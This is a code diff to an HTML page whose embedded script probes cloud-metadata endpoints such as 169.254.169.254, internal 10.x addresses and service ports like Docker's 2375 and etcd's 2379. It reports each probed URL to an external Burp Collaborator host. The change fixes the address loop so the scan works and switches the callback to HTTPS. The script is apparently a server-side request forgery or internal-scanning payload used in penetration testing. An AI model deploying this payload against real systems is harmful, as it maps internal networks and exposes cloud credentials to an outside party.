@@ -12,13 +12,13 @@
 
     <script>
 const ports = ["80-http", "443-https", "2375-http", "2376-https", "2379-http", "4242-http", "8000-http", "8080-http", "8082-http", "8443-https", "9001-http", "9200-http", "7001-http", "8888-http", "8500-http", "8501-https", "8983-http", "9121-http", "9999-http", "9999-https"];
-const internal_addresses = ["http://169.254.169.254", "http://0.0.0.0", "http://169.254.170.2", "http://192.0.0.192", "http://10.10.10.10", "http://10.0.0.0"];
+const addresses = ["http://169.254.169.254", "http://0.0.0.0", "http://169.254.170.2", "http://192.0.0.192", "http://10.10.10.10", "http://10.0.0.0"];
 
 
 function callback(url) {
     var xmlHttp = new XMLHttpRequest();
-        xmlHttp.open("GET", "http://5flwl1joja33ep8p1lcoatr34uaky9.burpcollaborator.net/" + url, false); // false for synchronous request
-        xmlHttp.send(null);
+    xmlHttp.open("GET", "https://od5fhuhtntvtfsmw08889md6nxtohd.burpcollaborator.net/" + url, false);
+    xmlHttp.send(null);
 }
 
 function test(url) {
@@ -47,8 +47,8 @@ for (let i in ports) {
     test(url);
 }
 
-for (let target in internal_addresses) {
-    test(target);
+for (let i in addresses) {
+    test(addresses[i]);
 }
     </script>
   </body>
